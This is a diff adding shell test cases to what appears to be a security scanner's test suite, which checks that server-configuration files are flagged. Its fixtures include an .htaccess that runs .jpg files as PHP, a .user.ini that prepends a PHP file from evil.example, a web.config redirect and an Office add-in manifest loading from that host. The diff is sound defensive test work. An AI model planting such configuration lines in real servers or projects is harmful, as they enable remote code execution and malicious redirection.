@@ -8140,6 +8140,37 @@ printf 'name: y\nbuild-type: Simple\n' > "$XDIR/ok.cabal"
 ./hlse_core file "$XDIR/ok.cabal" 2>&1 | grep -q "CABAL CUSTOM" \
     && check "file: simple cabal no F51" "0" "1" \
     || check "file: simple cabal no F51" "0" "0"
+# F52–F55: server-config carriers
+printf 'AddType application/x-httpd-php .jpg\nphp_flag engine on\n' \
+    > "$XDIR/.htaccess"
+./hlse_core file "$XDIR/.htaccess" 2>&1 | grep -q "SERVER CONFIG" \
+    && check "file: htaccess php handler flagged" "0" "0" \
+    || check "file: htaccess php handler flagged" "0" "1"
+printf 'DirectoryIndex index.html\n' > "$XDIR/ok.htaccess"
+mkdir -p "$XDIR/ht" && mv "$XDIR/ok.htaccess" "$XDIR/ht/.htaccess"
+./hlse_core file "$XDIR/ht/.htaccess" 2>&1 | grep -q "SERVER CONFIG" \
+    && check "file: benign htaccess no F52" "0" "1" \
+    || check "file: benign htaccess no F52" "0" "0"
+printf 'auto_prepend_file=http://evil.example/x.php\n' \
+    > "$XDIR/.user.ini"
+./hlse_core file "$XDIR/.user.ini" 2>&1 | grep -q "SERVER CONFIG" \
+    && check "file: user.ini auto_prepend flagged" "0" "0" \
+    || check "file: user.ini auto_prepend flagged" "0" "1"
+printf '<?xml version="1.0"?>\n<configuration><system.webServer><httpRedirect enabled="true" destination="http://evil.example"/></system.webServer></configuration>\n' \
+    > "$XDIR/web.config"
+./hlse_core file "$XDIR/web.config" 2>&1 | grep -q "SERVER CONFIG" \
+    && check "file: web.config httpRedirect flagged" "0" "0" \
+    || check "file: web.config httpRedirect flagged" "0" "1"
+printf '<?xml version="1.0"?>\n<configuration><system.web><compilation/></system.web></configuration>\n' \
+    > "$XDIR/ok-web.config"
+./hlse_core file "$XDIR/ok-web.config" 2>&1 | grep -q "SERVER CONFIG" \
+    && check "file: plain web.config no F54" "0" "1" \
+    || check "file: plain web.config no F54" "0" "0"
+printf '<?xml version="1.0"?>\n<OfficeApp><SourceLocation DefaultValue="https://evil.example/p.html"/></OfficeApp>\n' \
+    > "$XDIR/addin.xml"
+./hlse_core file "$XDIR/addin.xml" 2>&1 | grep -q "SERVER CONFIG" \
+    && check "file: office addin remote source flagged" "0" "0" \
+    || check "file: office addin remote source flagged" "0" "1"
 rm -rf "$XDIR"
 
 # ─── results ────────────────────────────────────────────────────────────
